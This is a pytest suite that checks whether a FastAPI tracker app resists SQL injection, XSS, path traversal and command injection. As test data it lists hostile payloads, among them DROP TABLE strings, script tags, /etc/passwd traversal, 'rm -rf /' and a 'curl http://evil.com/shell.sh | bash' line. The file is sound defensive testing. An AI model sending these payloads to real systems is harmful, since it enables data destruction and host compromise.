"""Comprehensive input validation and injection prevention tests."""

import sys
from pathlib import Path

# Add src directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

import pytest
from uuid import uuid4
from datetime import datetime, timezone
from fastapi.testclient import TestClient
from unittest.mock import Mock, patch

from soullink_tracker.main import app
from soullink_tracker.auth.jwt_auth import JWTTokenManager


@pytest.mark.unit
class TestSQLInjectionPrevention:
    """Test protection against SQL injection attacks."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def authenticated_client(self, client):
        """Create authenticated test client."""
        # Mock authentication for testing
        with patch("soullink_tracker.auth.jwt_auth.get_config") as mock_get_config:
            mock_config = Mock()
            mock_config.app.jwt_secret_key = "test-secret-key"
            mock_config.app.jwt_access_token_expires_minutes = 15
            mock_get_config.return_value = mock_config

            jwt_manager = JWTTokenManager()
            player_id = uuid4()
            run_id = uuid4()

            access_token, _, _, _ = jwt_manager.create_tokens(
                player_id=player_id, run_id=run_id, player_name="TestPlayer"
            )

            return (
                client,
                {"Authorization": f"Bearer {access_token}"},
                str(run_id),
                str(player_id),
            )

    def test_sql_injection_in_uuid_parameters(self, client):
        """Test SQL injection prevention in UUID path parameters."""
        sql_injection_payloads = [
            "'; DROP TABLE runs; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO runs VALUES ('evil'); --",
            "' OR 1=1 --",
            "admin'--",
            "' OR 'x'='x",
            "'; DELETE FROM players; --",
        ]

        for payload in sql_injection_payloads:
            # Test in various endpoints that expect UUIDs
            response = client.get(f"/v1/runs/{payload}/encounters")

            # Should return 422 (validation error) or 404, not 500 (server error)
            # This indicates proper input validation, not SQL injection
            assert response.status_code in [400, 401, 404, 422]

            # Should not contain SQL error messages
            response_text = response.text.lower()
            assert "sql" not in response_text
            assert "database" not in response_text or "error" in response_text
            assert "syntax error" not in response_text
            assert "mysql" not in response_text
            assert "postgresql" not in response_text
            assert "sqlite" not in response_text

    def test_sql_injection_in_query_parameters(self, authenticated_client):
        """Test SQL injection prevention in query parameters."""
        client, headers, run_id, _ = authenticated_client

        sql_injection_payloads = [
            "'; DROP TABLE encounters; --",
            "' OR '1'='1",
            "' UNION SELECT password FROM users --",
            "admin'; --",
        ]

        for payload in sql_injection_payloads:
            # Test various query parameters
            query_params = [
                f"?limit={payload}",
                f"?offset={payload}",
                f"?player_name={payload}",
                f"?status={payload}",
            ]

            for params in query_params:
                response = client.get(
                    f"/v1/runs/{run_id}/encounters{params}", headers=headers
                )

                # Should handle invalid parameters gracefully
                assert response.status_code in [200, 400, 422]

                # Should not expose SQL errors
                response_text = response.text.lower()
                assert "sql" not in response_text
                assert "syntax error" not in response_text

    def test_sql_injection_in_json_payload(self, client):
        """Test SQL injection prevention in JSON request bodies."""
        sql_injection_payloads = [
            "'; DROP TABLE events; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM players --",
            "admin'; DELETE FROM runs; --",
        ]

        for payload in sql_injection_payloads:
            # Test injection in various JSON fields
            test_payloads = [
                {"run_name": payload, "player_name": "test", "password": "test"},
                {"run_name": "test", "player_name": payload, "password": "test"},
                {"run_name": "test", "player_name": "test", "password": payload},
            ]

            for test_payload in test_payloads:
                response = client.post("/v1/auth/login", json=test_payload)

                # Should handle malicious payloads without SQL injection
                assert response.status_code in [400, 401, 404, 422]

                # Should not expose SQL internals
                response_text = response.text.lower()
                assert "sql" not in response_text
                assert "database" not in response_text or "error" in response_text


@pytest.mark.unit
class TestXSSPrevention:
    """Test protection against Cross-Site Scripting (XSS) attacks."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)

    def test_xss_in_json_responses(self, client):
        """Test that JSON responses are properly escaped to prevent XSS."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert('xss')</script>",
            "'><script>alert(String.fromCharCode(88,83,83))</script>",
            "\";alert('xss');//",
            "<svg onload=alert(1)>",
            "<%2fscript%3e%3cscript%3ealert('xss')%3c%2fscript%3e",
        ]

        for payload in xss_payloads:
            # Test XSS in various input fields
            test_data = {
                "run_name": payload,
                "player_name": "TestPlayer",
                "password": "testpass",
            }

            response = client.post("/v1/auth/login", json=test_data)

            # Response should be JSON (not HTML that could execute scripts)
            content_type = response.headers.get("content-type", "")
            assert (
                "application/json" in content_type
                or "application/problem+json" in content_type
            )

            # Should not contain unescaped script tags in response
            response_text = response.text
            if "<script>" in payload.lower():
                # The payload should be properly escaped or sanitized
                assert (
                    "<script>" not in response_text.lower()
                    or "escaped" in response_text.lower()
                )

    def test_xss_in_error_messages(self, client):
        """Test that error messages don't reflect XSS payloads."""
        xss_payloads = [
            "<script>alert('error_xss')</script>",
            "javascript:void(0)",
            "<img src=x onerror=alert('error')>",
        ]

        for payload in xss_payloads:
            # Try to inject XSS in various error scenarios
            response = client.get(f"/v1/runs/{payload}/encounters")

            # Should return proper error response
            assert response.status_code in [400, 401, 404, 422]

            # Error response should not contain executable script
            response_text = response.text
            assert "<script>" not in response_text.lower()
            assert "javascript:" not in response_text.lower()
            assert "onerror=" not in response_text.lower()

    def test_content_type_security(self, client):
        """Test that responses have secure content types."""
        # Test various endpoints
        endpoints = [
            "/health",
            "/v1/runs",
            "/v1/auth/login",
        ]

        for endpoint in endpoints:
            if endpoint == "/v1/auth/login":
                response = client.post(endpoint, json={"test": "data"})
            else:
                response = client.get(endpoint)

            content_type = response.headers.get("content-type", "")

            # Should be JSON, not HTML that could execute scripts
            if response.status_code in [200, 400, 401, 404, 422]:
                assert (
                    "application/json" in content_type
                    or "application/problem+json" in content_type
                )

                # Should not be HTML content type
                assert "text/html" not in content_type


@pytest.mark.unit
class TestInputValidationBoundaries:
    """Test input validation boundary conditions and edge cases."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)

    def test_uuid_validation_boundaries(self, client):
        """Test UUID validation with various invalid formats."""
        invalid_uuids = [
            "not-a-uuid",
            "12345678-1234-1234-1234-12345678901",  # Too short
            "12345678-1234-1234-1234-123456789012",  # Too long
            "GGGGGGGG-1234-1234-1234-123456789012",  # Invalid characters
            "12345678-GGGG-1234-1234-123456789012",  # Invalid characters
            "",  # Empty string
            "null",  # String null
            "undefined",  # String undefined
            "../../etc/passwd",  # Path traversal attempt
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded path traversal
        ]

        for invalid_uuid in invalid_uuids:
            response = client.get(f"/v1/runs/{invalid_uuid}/encounters")

            # Should return validation error, not server error
            assert response.status_code in [400, 404, 422]

            # Should not attempt to process invalid UUID
            response_text = response.text.lower()
            assert "internal error" not in response_text
            assert "500" not in response_text

    def test_string_length_validation(self, client):
        """Test string length validation boundaries."""
        # Test extremely long strings
        very_long_string = "x" * 10000  # 10KB string
        extremely_long_string = "y" * 100000  # 100KB string

        test_data = [
            {"run_name": very_long_string, "player_name": "test", "password": "test"},
            {
                "run_name": "test",
                "player_name": extremely_long_string,
                "password": "test",
            },
            {"run_name": "test", "player_name": "test", "password": very_long_string},
        ]

        for data in test_data:
            response = client.post("/v1/auth/login", json=data)

            # Should handle long strings gracefully
            assert response.status_code in [400, 401, 404, 413, 422]

            # Should not cause server errors
            assert response.status_code != 500

    def test_numeric_boundary_validation(self, client):
        """Test numeric input validation boundaries."""
        # Test with various numeric edge cases
        numeric_edge_cases = [
            -1,  # Negative numbers
            0,  # Zero
            2147483647,  # Max 32-bit integer
            2147483648,  # Max 32-bit integer + 1
            -2147483648,  # Min 32-bit integer
            -2147483649,  # Min 32-bit integer - 1
            9223372036854775807,  # Max 64-bit integer
            9223372036854775808,  # Max 64-bit integer + 1
            -9223372036854775808,  # Min 64-bit integer
            -9223372036854775809,  # Min 64-bit integer - 1
        ]

        for number in numeric_edge_cases:
            # Test in query parameters that expect numbers
            response = client.get(f"/v1/runs?limit={number}")

            # Should handle numeric boundaries appropriately
            assert response.status_code in [200, 400, 401, 422]

            # Should not cause integer overflow errors
            response_text = response.text.lower()
            assert "overflow" not in response_text
            assert "underflow" not in response_text

    def test_json_structure_validation(self, client):
        """Test JSON structure validation."""
        malformed_json_cases = [
            '{"invalid": json}',  # Invalid JSON syntax
            '{"missing_closing": "brace"',  # Unclosed JSON
            '{"nested": {"too": {"deep": {"structure": true}}}}',  # Deeply nested
            "[]",  # Array instead of object
            "null",  # Null value
            '""',  # Empty string
            "123",  # Number instead of object
            '{"circular": {"ref": null}}',  # Potential circular reference
        ]

        for malformed_json in malformed_json_cases:
            try:
                # Try to send malformed JSON
                response = client.post(
                    "/v1/auth/login",
                    data=malformed_json,
                    headers={"Content-Type": "application/json"},
                )

                # Should return JSON parsing error
                assert response.status_code in [400, 422]

            except Exception:
                # JSON parsing errors are acceptable
                pass

    def test_special_character_handling(self, client):
        """Test handling of special characters in inputs."""
        special_characters = [
            "\x00",  # Null byte
            "\x1f",  # Control character
            "\x7f",  # DEL character
            "\u0000",  # Unicode null
            "\u001f",  # Unicode control
            "\u007f",  # Unicode DEL
            "\u2028",  # Line separator
            "\u2029",  # Paragraph separator
            "\ufeff",  # Byte order mark
            "🚀",  # Emoji
            "💀",  # Emoji
            "东京",  # Non-Latin characters
            "москва",  # Cyrillic
            "العربية",  # Arabic
        ]

        for char in special_characters:
            test_data = {
                "run_name": f"test{char}run",
                "player_name": "TestPlayer",
                "password": "testpass",
            }

            response = client.post("/v1/auth/login", json=test_data)

            # Should handle special characters gracefully
            assert response.status_code in [200, 400, 401, 404, 422]

            # Should not cause encoding errors
            response_text = response.text
            assert "encoding" not in response_text.lower()
            assert "unicode" not in response_text.lower()


@pytest.mark.unit
class TestPathTraversalPrevention:
    """Test protection against path traversal attacks."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)

    def test_path_traversal_in_routes(self, client):
        """Test path traversal prevention in route parameters."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
            "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32",  # URL encoded backslashes
            "....//....//....//etc//passwd",  # Double slash
            "..%2f..%2f..%2fetc%2fpasswd",  # Mixed encoding
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",  # Unicode bypass attempt
        ]

        for payload in path_traversal_payloads:
            # Test in various route parameters
            endpoints = [
                f"/v1/runs/{payload}/encounters",
                f"/v1/runs/{payload}/status",
            ]

            for endpoint in endpoints:
                response = client.get(endpoint)

                # Should return validation error, not file access
                assert response.status_code in [400, 401, 404, 422]

                # Should not expose file system paths
                response_text = response.text.lower()
                assert "/etc/passwd" not in response_text
                assert "/windows/system32" not in response_text
                assert "file not found" not in response_text
                assert "access denied" not in response_text

    def test_path_traversal_in_static_files(self, client):
        """Test path traversal prevention for static file access."""
        # Test if application serves static files
        static_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]

        for payload in static_payloads:
            # Test common static file paths
            static_endpoints = [
                f"/static/{payload}",
                f"/assets/{payload}",
                f"/public/{payload}",
            ]

            for endpoint in static_endpoints:
                response = client.get(endpoint)

                # Should not serve files outside static directory
                assert response.status_code in [404, 403]

                # Should not expose system files
                if response.status_code == 200:
                    response_text = response.text
                    assert "root:" not in response_text  # passwd file content
                    assert "SYSTEM" not in response_text  # Windows system files

    def test_directory_listing_prevention(self, client):
        """Test that directory listing is disabled."""
        # Test common directory paths
        directory_paths = [
            "/",
            "/static/",
            "/assets/",
            "/public/",
            "/admin/",
        ]

        for path in directory_paths:
            response = client.get(path)

            # Should not return directory listings
            if response.status_code == 200:
                response_text = response.text.lower()
                assert "index of" not in response_text
                assert "directory listing" not in response_text
                assert (
                    "<li><a href=" not in response_text
                )  # Common directory listing format


@pytest.mark.unit
class TestCommandInjectionPrevention:
    """Test protection against command injection attacks."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)

    def test_command_injection_in_inputs(self, client):
        """Test command injection prevention in user inputs."""
        command_injection_payloads = [
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "; rm -rf /",
            "| rm -rf /",
            "&& rm -rf /",
            "; nc -l 4444",  # Netcat backdoor
            "| nc -l 4444",
            "; wget http://evil.com/malware",
            "| curl http://evil.com/shell.sh | bash",
        ]

        for payload in command_injection_payloads:
            # Test in various input fields
            test_data = {
                "run_name": f"test{payload}",
                "player_name": "TestPlayer",
                "password": "testpass",
            }

            response = client.post("/v1/auth/login", json=test_data)

            # Should handle inputs without executing commands
            assert response.status_code in [200, 400, 401, 404, 422]

            # Should not expose command execution errors
            response_text = response.text.lower()
            assert "command not found" not in response_text
            assert "permission denied" not in response_text
            assert "/bin/sh" not in response_text
            assert "/bin/bash" not in response_text

    def test_shell_metacharacter_handling(self, client):
        """Test handling of shell metacharacters."""
        shell_metacharacters = [
            ";",
            "|",
            "&",
            "`",
            "$",
            "(",
            ")",
            ">",
            "<",
            "*",
            "?",
            "[",
            "]",
            "{",
            "}",
            "~",
            "!",
            "#",
            "\\",
            '"',
            "'",
        ]

        for char in shell_metacharacters:
            test_data = {
                "run_name": f"test{char}run",
                "player_name": "TestPlayer",
                "password": "testpass",
            }

            response = client.post("/v1/auth/login", json=test_data)

            # Should process metacharacters as literal text, not shell commands
            assert response.status_code in [200, 400, 401, 404, 422]

            # Should not indicate shell interpretation
            response_text = response.text.lower()
            assert "syntax error" not in response_text
            assert "unexpected token" not in response_text


@pytest.mark.integration
class TestInputValidationIntegration:
    """Integration tests for input validation across the application."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)

    def test_comprehensive_input_validation_flow(self, client):
        """Test input validation across multiple endpoints in sequence."""
        # Test a complete flow with various malicious inputs
        malicious_inputs = [
            "'; DROP TABLE runs; --",  # SQL injection
            "<script>alert('xss')</script>",  # XSS
            "../../../etc/passwd",  # Path traversal
            "; cat /etc/passwd",  # Command injection
        ]

        for malicious_input in malicious_inputs:
            # Test login flow
            login_response = client.post(
                "/v1/auth/login",
                json={
                    "run_name": malicious_input,
                    "player_name": "TestPlayer",
                    "password": "testpass",
                },
            )

            # Should handle malicious input safely
            assert login_response.status_code in [400, 401, 404, 422]

            # Test API endpoints
            api_response = client.get(f"/v1/runs/{malicious_input}/encounters")
            assert api_response.status_code in [400, 401, 404, 422]

            # Application should remain stable
            health_response = client.get("/health")
            assert health_response.status_code == 200

    def test_error_response_consistency(self, client):
        """Test that error responses are consistent for various invalid inputs."""
        # Different types of invalid inputs should produce consistent error responses
        invalid_inputs = [
            "not-a-uuid",
            "'; DROP TABLE users; --",
            "<script>alert(1)</script>",
            "../../../etc/passwd",
            "; rm -rf /",
        ]

        error_responses = []
        for invalid_input in invalid_inputs:
            response = client.get(f"/v1/runs/{invalid_input}/encounters")
            error_responses.append(
                (response.status_code, response.headers.get("content-type"))
            )

        # All should return similar error types (validation errors)
        status_codes = [r[0] for r in error_responses]
        assert all(code in [400, 401, 404, 422] for code in status_codes)

        # All should have consistent content types
        content_types = [r[1] for r in error_responses if r[1]]
        if content_types:
            # Should be JSON error responses
            assert all(
                "application/json" in ct or "application/problem+json" in ct
                for ct in content_types
            )

    def test_input_validation_performance(self, client):
        """Test that input validation doesn't cause performance issues."""
        # Test with moderately large inputs to ensure validation is efficient
        large_input = "x" * 1000  # 1KB input

        # Measure validation performance (shouldn't cause timeouts)
        start_time = datetime.now(timezone.utc)

        response = client.post(
            "/v1/auth/login",
            json={
                "run_name": large_input,
                "player_name": "TestPlayer",
                "password": "testpass",
            },
        )

        end_time = datetime.now(timezone.utc)
        duration = (end_time - start_time).total_seconds()

        # Should respond quickly (validation shouldn't be expensive)
        assert duration < 5.0  # Should respond within 5 seconds

        # Should still validate properly
        assert response.status_code in [200, 400, 401, 404, 422]
